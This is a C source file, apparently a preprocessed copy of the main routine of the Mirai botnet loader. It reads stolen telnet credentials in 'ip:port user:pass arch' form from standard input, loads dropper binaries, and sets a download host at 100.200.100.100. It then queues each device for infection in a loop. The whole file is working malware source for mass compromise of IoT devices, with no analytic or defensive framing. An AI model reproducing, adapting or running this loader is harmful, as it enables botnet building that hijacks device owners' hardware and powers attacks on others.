
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


typedef int uint8_t ;
typedef scalar_t__ uint32_t ;
struct telnet_info {int dummy; } ;
typedef int strbuf ;
typedef int pthread_t ;
typedef int ipv4_t ;
struct TYPE_4__ {int curr_open; int total_input; } ;


 scalar_t__ ATOMIC_GET (int *) ;
 int ATOMIC_INC (int *) ;
 scalar_t__ TRUE ;
 int _SC_NPROCESSORS_ONLN ;
 int binary_init () ;
 int * calloc (int,int) ;
 int * fgets (char*,int,int ) ;
 char* id_tag ;
 int inet_addr (char*) ;
 int memset (struct telnet_info*,int ,int) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,int ,int *) ;
 TYPE_1__* server_create (int ,int,int *,int,char*,int,char*) ;
 int server_queue_telnet (TYPE_1__*,struct telnet_info*) ;
 int sleep (int) ;
 TYPE_1__* srv ;
 int stats_thread ;
 int stdin ;
 scalar_t__ strlen (char*) ;
 int sysconf (int ) ;
 int * telnet_info_parse (char*,struct telnet_info*) ;
 int usleep (int) ;
 int util_trim (char*) ;

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;






    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));

    addrs[0] = inet_addr("192.168.0.1");
    addrs[1] = inet_addr("192.168.1.1");


    if (argc == 2)
    {
        id_tag = args[1];
    }

    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }


    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == ((void*)0))
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    pthread_create(&stats_thrd, ((void*)0), stats_thread, ((void*)0));


    while (TRUE)
    {
        char strbuf[1024];

        if (fgets(strbuf, sizeof (strbuf), stdin) == ((void*)0))
            break;

        util_trim(strbuf);

        if (strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == ((void*)0))
            printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        else
        {
            if (srv == ((void*)0))
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);
            if (total++ % 1000 == 0)
                sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);

    return 0;
}
